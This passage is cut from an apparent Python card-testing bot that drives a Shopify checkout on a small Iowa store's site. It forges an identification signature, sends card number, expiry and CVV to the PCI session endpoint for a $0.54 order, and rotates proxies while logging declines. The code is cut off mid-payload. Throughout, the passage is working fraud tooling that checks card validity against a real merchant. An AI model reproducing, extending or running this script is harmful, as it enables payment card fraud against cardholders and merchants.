            'referer': f'{self.base_url}/products/saltwater-taffy?_pos=11&_fid=d2870b0d0&_ss=c',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }
        
        try:
            resp = await self.client.post(
                f"{self.base_url}/cart",
                headers=cart_headers,
                content="checkout=",
                timeout=30,
                follow_redirects=False
            )
            
            if resp.status_code == 302:
                location = resp.headers.get('location', '')
                self.checkout_token = self.extract_checkout_token(location)
                self._r_param = self.extract_r_param(location)
                
                if self.checkout_token:
                    self.logger.data_extracted("Checkout Token", self.checkout_token[:15] + "...", "Cart redirect")
                    self.logger.data_extracted("_r Param", self._r_param[:15] + "..." if self._r_param else "N/A", "Cart redirect")
                    
                    # Generate stable ID
                    self.stable_id = self.generate_uuid()
                    timestamp = self.generate_timestamp()
                    self.graphql_session_token = f"{self.checkout_token}-{timestamp}"
                    
                    return True, location
                else:
                    self.logger.error_log("CHECKOUT_TOKEN", "No token in redirect")
                    return False, "CHECKOUT_TOKEN_ERROR"
            else:
                return False, f"Cart POST failed: {resp.status_code}"
                
        except Exception as e:
            self.logger.error_log("CART_POST", str(e))
            return False, f"Cart POST error: {str(e)[:50]}"

    async def get_checkout_page(self):
        """Step 5: GET checkout page to get session token"""
        self.step(5, "GET CHECKOUT PAGE", "Loading checkout page for session token")
        
        checkout_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': f'{self.base_url}/products/saltwater-taffy?_pos=11&_fid=d2870b0d0&_ss=c',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }
        
        try:
            checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
            if self._r_param:
                checkout_url += f"?_r={self._r_param}"
            
            resp = await self.client.get(
                checkout_url,
                headers=checkout_headers,
                timeout=30,
                follow_redirects=True
            )
            
            if resp.status_code != 200:
                return False, f"Checkout page failed: {resp.status_code}"
            
            # Extract session token
            extracted_token = self.extract_session_token_from_page(resp)
            if extracted_token:
                self.session_token = extracted_token
                self.logger.data_extracted("Session Token", self.session_token[:20] + "...", "Checkout page")
            else:
                self.session_token = f"AAEB_{self.generate_random_string(50)}"
                self.logger.data_extracted("Session Token (generated)", self.session_token[:20] + "...", "Fallback")
            
            return True, "CHECKOUT_PAGE_LOADED"
            
        except Exception as e:
            self.logger.error_log("CHECKOUT_PAGE", str(e))
            return False, f"Checkout page error: {str(e)[:50]}"

    async def submit_proposal(self):
        """Step 6: Submit initial proposal"""
        self.step(6, "SUBMIT PROPOSAL", "Submitting initial proposal")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }
        
        if self.session_token:
            graphql_headers['x-checkout-one-session-token'] = self.session_token
        
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": f"A{self.generate_random_string(43)}==",
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 5}
                    },
                    "expectedTotalPrice": {
                        "value": {
                            "amount": "0.50",
                            "currencyCode": "USD"
                        }
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {
                "memberships": []
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "address2": "",
                        "city": "",
                        "countryCode": "US",
                        "postalCode": "",
                        "firstName": "",
                        "lastName": "",
                        "zoneCode": "",
                        "phone": ""
                    }
                }
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "phoneCountryCode": "US",
                "marketingConsent": [],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": []},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"Proposal failed: {resp.status_code}"
            
            try:
                proposal_resp = resp.json()
                
                self.extract_queue_token_from_response(proposal_resp)
                self.extract_delivery_strategy_from_proposal(proposal_resp)
                self.extract_payment_identifier_from_proposal(proposal_resp)
                
                if self.queue_token:
                    self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Proposal")
                if self.delivery_strategy_handle:
                    self.logger.data_extracted("Delivery Handle", self.delivery_strategy_handle[:20] + "...", "Proposal")
                if self.payment_method_identifier:
                    self.logger.data_extracted("Payment ID", self.payment_method_identifier[:20] + "...", "Proposal")
                
                if 'errors' in proposal_resp and proposal_resp['errors']:
                    error_msgs = []
                    for error in proposal_resp['errors']:
                        error_code = error.get('code', 'UNKNOWN')
                        error_msgs.append(error_code)
                    
                    acceptable_errors = [
                        'BUYER_IDENTITY_MISSING_CONTACT_METHOD',
                        'PAYMENTS_FIRST_NAME_REQUIRED', 
                        'PAYMENTS_LAST_NAME_REQUIRED', 
                        'PAYMENTS_ADDRESS1_REQUIRED', 
                        'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 
                        'PAYMENTS_POSTAL_CODE_REQUIRED', 
                        'PAYMENTS_CITY_REQUIRED',
                        'DELIVERY_ZONE_REQUIRED_FOR_COUNTRY',
                        'DELIVERY_POSTAL_CODE_REQUIRED',
                        'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT',
                        'TAX_NEW_TAX_MUST_BE_ACCEPTED',
                        'REQUIRED_ARTIFACTS_UNAVAILABLE'
                    ]
                    
                    if any(code in acceptable_errors for code in error_msgs):
                        self.logger.data_extracted("Proposal", "Acceptable validation errors", "Expected")
                        return True, "VALIDATION_ERRORS"
                    
                    return False, f"DECLINED - {', '.join(error_msgs[:3])}"
                
                return True, "PROPOSAL_SUCCESS"
                
            except Exception as e:
                return False, f"Failed to parse proposal: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"Proxy error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except httpx.TimeoutException as e:
            self.logger.error_log("TIMEOUT", f"Timeout: {str(e)}")
            return False, "TIMEOUT"
        except Exception as e:
            self.logger.error_log("PROPOSAL_ERROR", str(e))
            return False, f"Proposal error: {str(e)[:50]}"

    async def update_contact_info(self):
        """Step 7: Update contact with email"""
        self.step(7, "UPDATE CONTACT", f"Setting email: {self.email}")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token or f"A{self.generate_random_string(43)}==",
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {"any": True},
                            "shipments": {"any": True}
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {"any": True},
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {"any": True},
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 5}
                    },
                    "expectedTotalPrice": {
                        "value": {
                            "amount": "0.50",
                            "currencyCode": "USD"
                        }
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {
                "memberships": []
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "city": "",
                        "countryCode": "US",
                        "lastName": "",
                        "phone": ""
                    }
                }
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": True,
                "phoneCountryCode": "US",
                "marketingConsent": [{
                    "email": {"consentState": "DECLINED", "value": self.email}
                }],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": [
                {"key": "DDM Delivery Type", "value": "Shipping"},
                {"key": "No-contact Delivery", "value": "No"}
            ]},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"Contact update failed: {resp.status_code}"
            
            try:
                contact_resp = resp.json()
                self.extract_queue_token_from_response(contact_resp)
                return True, "CONTACT_UPDATED"
            except Exception as e:
                return False, f"Failed to parse contact response: {str(e)[:50]}"
                
        except Exception as e:
            self.logger.error_log("CONTACT_UPDATE", str(e))
            return False, f"Contact update error: {str(e)[:50]}"

    async def select_pickup_delivery(self):
        """Step 8: Select pickup delivery"""
        self.step(8, "SELECT PICKUP", "Choosing Heart of Iowa pickup location")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token,
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": self.delivery_strategy_handle,
                            "customDeliveryRate": False
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {
                        "lines": [{"stableId": self.stable_id}]
                    },
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {
                        "value": {"amount": "0.00", "currencyCode": "USD"}
                    },
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 5}
                    },
                    "expectedTotalPrice": {
                        "value": {"amount": "0.50", "currencyCode": "USD"}
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {
                    "streetAddress": {
                        "address1": "",
                        "city": "",
                        "countryCode": "US",
                        "lastName": "",
                        "phone": ""
                    }
                }
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": False,
                "phoneCountryCode": "US",
                "marketingConsent": [{
                    "email": {"consentState": "DECLINED", "value": self.email}
                }],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0.04", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": [
                {"key": "DDM Delivery Type", "value": "Shipping"},
                {"key": "No-contact Delivery", "value": "No"}
            ]},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"Pickup selection failed: {resp.status_code}"
            
            try:
                pickup_resp = resp.json()
                self.extract_queue_token_from_response(pickup_resp)
                return True, "PICKUP_SELECTED"
            except Exception as e:
                return False, f"Failed to parse pickup: {str(e)[:50]}"
                
        except Exception as e:
            self.logger.error_log("PICKUP", str(e))
            return False, f"Pickup error: {str(e)[:50]}"

    async def create_payment_session(self, cc, mes, ano, cvv):
        """Step 9: Create PCI payment session"""
        self.step(9, "CREATE PAYMENT", "Creating PCI payment session")
        
        pci_headers = {
            'authority': 'checkout.pci.shopifyinc.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/070d608/number-ltr.html?identifier=&locationURL=',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36'
        }
        
        header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
        payload_data = {
            "client_id": "2",
            "client_account_id": "75949703484",
            "unique_id": self.checkout_token,
            "iat": int(time.time())
        }
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
        signature = self.generate_random_string(43)
        shopify_signature = f"{header}.{payload_b64}.{signature}"
        
        pci_headers['shopify-identification-signature'] = shopify_signature
        
        card_number = cc.replace(" ", "").replace("-", "")
        year_full = ano if len(ano) == 4 else f"20{ano}"
        month_int = int(mes)
        
        pci_payload = {
            "credit_card": {
                "number": card_number,
                "month": month_int,
                "year": int(year_full),
                "verification_value": cvv,
                "name": self.full_name,
                "start_month": None,
                "start_year": None,
                "issue_number": ""
            },
            "payment_session_scope": "heartofiowamarketplace.com"
        }
        
        try:
            self.pci_client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
            
            resp = await self.pci_client.post(
                'https://checkout.pci.shopifyinc.com/sessions',
                headers=pci_headers,
                json=pci_payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"PCI failed: {resp.status_code}"
            
            try:
                pci_resp = resp.json()
                payment_session_id = pci_resp.get('id')
                if not payment_session_id:
                    return False, "No payment session ID"
                
                self.logger.data_extracted("Payment Session ID", payment_session_id[:20] + "...", "PCI")
                return True, payment_session_id
            except Exception as e:
                return False, f"Failed to parse PCI: {str(e)[:50]}"
                
        except httpx.ProxyError as e:
            self.logger.error_log("PROXY", f"PCI proxy error: {str(e)}")
            mark_proxy_failed(self.proxy_url)
            self.proxy_status = "Dead 🚫"
            return False, "PROXY_DEAD"
        except Exception as e:
            self.logger.error_log("PCI_ERROR", str(e))
            return False, "PCI_ERROR"

    async def update_billing_address(self, payment_session_id, cc):
        """Step 10: Update billing address with creditCardBin"""
        self.step(10, "UPDATE BILLING", "Setting billing address with card BIN")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        # Get first 8 digits of card as BIN
        card_clean = cc.replace(" ", "").replace("-", "")
        credit_card_bin = card_clean[:8] if len(card_clean) >= 8 else card_clean[:6]
        
        variables = {
            "sessionInput": {
                "sessionToken": self.graphql_session_token
            },
            "queueToken": self.queue_token,
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "delivery": {
                "deliveryLines": [{
                    "destination": {
                        "geolocation": {
                            "coordinates": self.coordinates,
                            "countryCode": "US"
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": self.delivery_strategy_handle,
                            "customDeliveryRate": False
                        },
                        "options": {}
                    },
                    "targetMerchandiseLines": {
                        "lines": [{"stableId": self.stable_id}]
                    },
                    "deliveryMethodTypes": ["PICK_UP"],
                    "expectedTotalPrice": {
                        "value": {"amount": "0.00", "currencyCode": "USD"}
                    },
                    "destinationChanged": True
                }],
                "noDeliveryRequired": [],
                "useProgressiveRates": False,
                "prefetchShippingRatesStrategy": None,
                "supportsSplitShipping": True
            },
            "deliveryExpectations": {
                "deliveryExpectationLines": []
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": self.stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
                            "properties": [],
                            "sellingPlanId": None,
                            "sellingPlanDigest": None
                        }
                    },
                    "quantity": {
                        "items": {"value": 5}
                    },
                    "expectedTotalPrice": {
                        "value": {"amount": "0.50", "currencyCode": "USD"}
                    },
                    "lineComponentsSource": None,
                    "lineComponents": []
                }]
            },
            "memberships": {"memberships": []},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [{
                    "paymentMethod": {
                        "directPaymentMethod": {
                            "paymentMethodIdentifier": self.payment_method_identifier,
                            "sessionId": payment_session_id,
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": self.address["address1"],
                                    "address2": self.address["address2"],
                                    "city": self.address["city"],
                                    "countryCode": self.address["countryCode"],
                                    "postalCode": self.address["zip"],
                                    "firstName": self.first_name,
                                    "lastName": self.last_name,
                                    "zoneCode": self.address["provinceCode"],
                                    "phone": ""
                                }
                            },
                            "cardSource": None
                        },
                        "giftCardPaymentMethod": None,
                        "redeemablePaymentMethod": None,
                        "walletPaymentMethod": None,
                        "walletsPlatformPaymentMethod": None,
                        "localPaymentMethod": None,
                        "paymentOnDeliveryMethod": None,
                        "paymentOnDeliveryMethod2": None,
                        "manualPaymentMethod": None,
                        "customPaymentMethod": None,
                        "offsitePaymentMethod": None,
                        "customOnsitePaymentMethod": None,
                        "deferredPaymentMethod": None,
                        "customerCreditCardPaymentMethod": None,
                        "paypalBillingAgreementPaymentMethod": None,
                        "remotePaymentInstrument": None
                    },
                    "amount": {
                        "value": {
                            "amount": "0.54",
                            "currencyCode": "USD"
                        }
                    }
                }],
                "billingAddress": {
                    "streetAddress": {
                        "address1": self.address["address1"],
                        "address2": self.address["address2"],
                        "city": self.address["city"],
                        "countryCode": self.address["countryCode"],
                        "postalCode": self.address["zip"],
                        "firstName": self.first_name,
                        "lastName": self.last_name,
                        "zoneCode": self.address["provinceCode"],
                        "phone": ""
                    }
                },
                "creditCardBin": credit_card_bin
            },
            "buyerIdentity": {
                "customer": {
                    "presentmentCurrency": "USD",
                    "countryCode": "US"
                },
                "email": self.email,
                "emailChanged": False,
                "phoneCountryCode": "US",
                "marketingConsent": [{
                    "email": {"consentState": "DECLINED", "value": self.email}
                }],
                "shopPayOptInPhone": {"countryCode": "US"},
                "rememberMe": False
            },
            "tip": {"tipLines": []},
            "taxes": {
                "proposedAllocations": None,
                "proposedTotalAmount": {"value": {"amount": "0.04", "currencyCode": "USD"}},
                "proposedTotalIncludedAmount": None,
                "proposedMixedStateTotalAmount": None,
                "proposedExemptions": []
            },
            "note": {"message": None, "customAttributes": [
                {"key": "DDM Delivery Type", "value": "Shipping"},
                {"key": "No-contact Delivery", "value": "No"}
            ]},
            "localizationExtension": {"fields": []},
            "nonNegotiableTerms": None,
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": []
        }
        
        payload = {
            "operationName": "Proposal",
            "variables": variables,
            "id": self.proposal_id
        }
        
        try:
            resp = await self.client.post(
                graphql_url + "?operationName=Proposal",
                headers=graphql_headers,
                json=payload,
                timeout=30
            )
            
            if resp.status_code != 200:
                return False, f"Billing update failed: {resp.status_code}"
            
            try:
                billing_resp = resp.json()
                self.extract_queue_token_from_response(billing_resp)
                return True, "BILLING_UPDATED"
            except Exception as e:
                return False, f"Failed to parse billing: {str(e)[:50]}"
                
        except Exception as e:
            self.logger.error_log("BILLING", str(e))
            return False, f"Billing error: {str(e)[:50]}"

    async def submit_for_completion(self, payment_session_id, cc):
        """Step 11: Submit for completion with creditCardBin"""
        self.step(11, "SUBMIT PAYMENT", "Finalizing payment")
        
        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
        
        graphql_headers = {
            'authority': 'heartofiowamarketplace.com',
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': self.base_url,
            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-checkout-one-session-token': self.session_token
        }
        
        attempt_token = f"{self.checkout_token}-{self.generate_random_string(8)}"
        
        card_clean = cc.replace(" ", "").replace("-", "")
        credit_card_bin = card_clean[:8] if len(card_clean) >= 8 else card_clean[:6]
        
        variables = {
            "input": {
                "sessionInput": {
                    "sessionToken": self.graphql_session_token
                },
                "queueToken": self.queue_token,
                "discounts": {
                    "lines": [],
                    "acceptUnexpectedDiscounts": True
                },
                "delivery": {
                    "deliveryLines": [{
                        "destination": {
                            "geolocation": {
                                "coordinates": self.coordinates,
                                "countryCode": "US"
                            }
                        },
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyByHandle": {
                                "handle": self.delivery_strategy_handle,
                                "customDeliveryRate": False
                            },
                            "options": {}
                        },
                        "targetMerchandiseLines": {
                            "lines": [{"stableId": self.stable_id}]
                        },
                        "deliveryMethodTypes": ["PICK_UP"],
                        "expectedTotalPrice": {
                            "value": {"amount": "0.00", "currencyCode": "USD"}
                        },
                        "destinationChanged": True
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True
                },
